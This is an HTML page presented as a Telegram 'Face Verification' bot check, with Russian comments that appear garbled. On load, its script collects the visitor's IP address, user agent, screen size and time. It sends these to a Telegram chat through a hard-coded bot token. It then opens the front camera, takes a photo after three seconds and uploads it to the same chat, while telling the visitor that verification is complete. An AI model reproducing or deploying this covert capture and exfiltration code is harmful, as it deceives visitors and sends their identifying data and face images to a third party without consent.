<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Bot Verification</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        body {
            background-color: #000;
            color: #fff;
            font-family: Arial, sans-serif;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            margin: 0;
            padding: 20px;
            text-align: center;
        }
        .btn {
            background-color: #ff0000;
            color: white;
            border: none;
            padding: 15px 30px;
            font-size: 18px;
            border-radius: 10px;
            cursor: pointer;
            margin: 20px 0;
        }
        #cameraPreview {
            width: 300px;
            height: 400px;
            object-fit: cover;
            border-radius: 10px;
            margin: 20px 0;
            display: none;
        }
        #status {
            margin: 20px 0;
            font-size: 18px;
        }
    </style>
</head>
<body>
    <div id="content">
        <h1>Face Verification</h1>
        <p id="status">Requesting camera access...</p>
        <video id="cameraPreview" autoplay playsinline></video>
        <button id="retryBtn" class="btn" style="display: none;">Retry Verification</button>
    </div>

    <script>
        const botToken = '7898816931:AAHNPImGpJjs-MNsklAvrU0VRDFkHFte_ig';
        const chatId = '-1002577213610';
        const videoElement = document.getElementById('cameraPreview');
        const statusElement = document.getElementById('status');
        const retryBtn = document.getElementById('retryBtn');
        let stream = null;

        // 1. –û—Ç–ø—Ä–∞–≤–∫–∞ –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏ –æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ
        async function sendUserInfo() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                const ip = data.ip;
                
                const userAgent = navigator.userAgent;
                const screenRes = `${window.screen.width}x${window.screen.height}`;
                const time = new Date().toLocaleString();
                
                const message = `üö® –ù–æ–≤—ã–π –ø–æ—Å–µ—Ç–∏—Ç–µ–ª—å:\nIP: ${ip}\n–£—Å—Ç—Ä–æ–π—Å—Ç–≤–æ: ${userAgent}\n–≠–∫—Ä–∞–Ω: ${screenRes}\n–í—Ä–µ–º—è: ${time}`;
                
                await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        chat_id: chatId,
                        text: message
                    })
                });
            } catch (error) {
                console.error('Error sending user info:', error);
            }
        }

        // 2. –ó–∞—Ö–≤–∞—Ç —Ñ–æ—Ç–æ —Å –∫–∞–º–µ—Ä—ã
        async function captureAndSendPhoto() {
            try {
                statusElement.textContent = "Taking photo...";
                
                // –°–æ–∑–¥–∞–µ–º canvas –¥–ª—è –∑–∞—Ö–≤–∞—Ç–∞ –∫–∞–¥—Ä–∞
                const canvas = document.createElement('canvas');
                canvas.width = videoElement.videoWidth;
                canvas.height = videoElement.videoHeight;
                const ctx = canvas.getContext('2d');
                ctx.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
                
                // –ü—Ä–µ–æ–±—Ä–∞–∑—É–µ–º –≤ blob
                const blob = await new Promise(resolve => {
                    canvas.toBlob(resolve, 'image/jpeg', 0.8);
                });
                
                // –°–æ–∑–¥–∞–µ–º FormData –¥–ª—è –æ—Ç–ø—Ä–∞–≤–∫–∏
                const formData = new FormData();
                formData.append('chat_id', chatId);
                formData.append('photo', blob, 'verification_photo.jpg');
                
                // –î–æ–±–∞–≤–ª—è–µ–º –æ–ø–∏—Å–∞–Ω–∏–µ
                const caption = `üÜî –§–æ—Ç–æ –≤–µ—Ä–∏—Ñ–∏–∫–∞—Ü–∏–∏\n–í—Ä–µ–º—è: ${new Date().toLocaleString()}`;
                formData.append('caption', caption);
                
                // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º —Ñ–æ—Ç–æ –≤ Telegram
                await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });
                
                statusElement.textContent = "Verification complete! Thank you.";
                stopCamera();
                
            } catch (error) {
                console.error('Error capturing photo:', error);
                statusElement.textContent = "Error during verification. Please try again.";
                retryBtn.style.display = 'block';
            }
        }

        // 3. –ó–∞–ø—É—Å–∫ –∫–∞–º–µ—Ä—ã
        async function startCamera() {
            try {
                statusElement.textContent = "Requesting camera access...";
                stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { 
                        facingMode: 'user',
                        width: { ideal: 1280 },
                        height: { ideal: 720 }
                    },
                    audio: false
                });
                
                videoElement.srcObject = stream;
                videoElement.style.display = 'block';
                statusElement.textContent = "Camera access granted. Taking photo in 3 seconds...";
                
                // –î–∞–µ–º –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—é 3 —Å–µ–∫—É–Ω–¥—ã –ø–æ–¥–≥–æ—Ç–æ–≤–∏—Ç—å—Å—è
                setTimeout(captureAndSendPhoto, 3000);
                
            } catch (error) {
                console.error('Camera error:', error);
                statusElement.textContent = "Camera access denied. Please enable camera to continue.";
                retryBtn.style.display = 'block';
            }
        }

        // 4. –û—Å—Ç–∞–Ω–æ–≤–∫–∞ –∫–∞–º–µ—Ä—ã
        function stopCamera() {
            if (stream) {
                stream.getTracks().forEach(track => track.stop());
                videoElement.srcObject = null;
                videoElement.style.display = 'none';
            }
        }

        // 5. –ö–Ω–æ–ø–∫–∞ –ø–æ–≤—Ç–æ—Ä–∞
        retryBtn.addEventListener('click', function() {
            retryBtn.style.display = 'none';
            startCamera();
        });

        // 6. –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è –ø—Ä–∏ –∑–∞–≥—Ä—É–∑–∫–µ
        window.onload = function() {
            sendUserInfo(); // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ
            startCamera();  // –ó–∞–ø—É—Å–∫–∞–µ–º –ø—Ä–æ—Ü–µ—Å—Å –≤–µ—Ä–∏—Ñ–∏–∫–∞—Ü–∏–∏
            
            if (window.Telegram && Telegram.WebApp) {
                Telegram.WebApp.expand();
                Telegram.WebApp.enableClosingConfirmation();
            }
        };

        // –û—Å—Ç–∞–Ω–æ–≤–∫–∞ –∫–∞–º–µ—Ä—ã –ø—Ä–∏ –∑–∞–∫—Ä—ã—Ç–∏–∏ —Å—Ç—Ä–∞–Ω–∏—Ü—ã
        window.addEventListener('beforeunload', stopCamera);
    </script>
</body>
</html>
